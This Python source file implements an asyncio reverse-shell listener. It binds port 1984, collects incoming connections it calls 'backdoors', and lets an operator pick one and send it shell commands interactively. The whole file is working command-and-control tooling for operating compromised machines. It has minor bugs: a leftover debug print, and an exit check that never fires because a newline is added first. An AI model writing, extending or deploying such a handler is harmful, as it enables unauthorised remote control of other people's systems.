import asyncio
import aiochannel
import aioconsole
from typing import Optional
SERVER_HOST = "0.0.0.0"
SERVER_PORT = 1984
BUFFER_SIZE = 1024


class ReverseShellManager:
    def __init__(self):
        self.backdoors = {}
    def list_backdoors(self):
        return list(self.backdoors.keys())
    async def read(self, backdoor)-> Optional[bytes]:
        if backdoor not in self.backdoors:
            return None
        #check if the backdoor is still connected
        if self.backdoors[backdoor][0].at_eof():
            #prune the backdoor
            del self.backdoors[backdoor]
            return None
        #read the data
        return await self.backdoors[backdoor][0].read(BUFFER_SIZE)
    async def write(self, backdoor, data) -> bool:
        if backdoor not in self.backdoors:
            return False
        #check if the backdoor is still connected
        if self.backdoors[backdoor][1].is_closing():
            #prune the backdoor
            del self.backdoors[backdoor]
            return False
        #write the data
        self.backdoors[backdoor][1].write(data)
        await self.backdoors[backdoor][1].drain()
        return True
    async def __handle_backdoor__(self, reader, writer):
        remote = writer.get_extra_info('peername')[0] + ":" + str(writer.get_extra_info('peername')[1])
        self.backdoors[remote] = (reader, writer)
        #await it closing
        await self.backdoors[remote][1].wait_closed()
async def main():
    # Create the ReverseShellManager
    rsm = ReverseShellManager()
    # Create the server
    server = await asyncio.start_server(rsm.__handle_backdoor__, SERVER_HOST, SERVER_PORT)
    # Start the server
    lock = asyncio.Lock()
    while True:
        print("Select a backdoor to interact with:")
        print(rsm.list_backdoors())
        selection = None
        async with lock:
            selection = await aioconsole.ainput("> ")
        if selection == "":
            continue
        if selection not in rsm.list_backdoors():
            print("Invalid selection")
            continue
        else:
            print(f"Interacting with {selection}")
                # read_bytes = await rsm.read(selection)
                # if read_bytes is None:
                #     break
                # print(read_bytes.decode(), end="")
                # input_bytes = await aioconsole.ainput(f"{selection}> ")
                # if input_bytes == "":
                #     continue
                # elif input_bytes.lower() == "exit":
                #     break
                # else:
                #     await rsm.write(selection, input_bytes.encode())
            async def read():
                while True:
                    read_bytes = await rsm.read(selection)
                    if read_bytes is None:
                        break
                    print("read_bytes")
                    print(read_bytes.decode(), end="")
            async def write():
                while True:
                    async with lock:
                        try:
                            input_bytes = await aioconsole.ainput(f"{selection}> ")
                            #add newline
                            input_bytes += "\n"
                            if input_bytes == "":
                                continue
                            elif input_bytes.lower() == "exit":
                                break
                            else:
                                await rsm.write(selection, input_bytes.encode())
                        except: #EOFError:
                            break
            tasks = [asyncio.create_task(read()), asyncio.create_task(write())]
            #wait for first task to finis
            done, pending = await asyncio.wait(tasks, return_when=asyncio.FIRST_COMPLETED)
            #cancel the other task
            for task in pending:
                task.cancel()
if __name__ == "__main__":
    asyncio.run(main())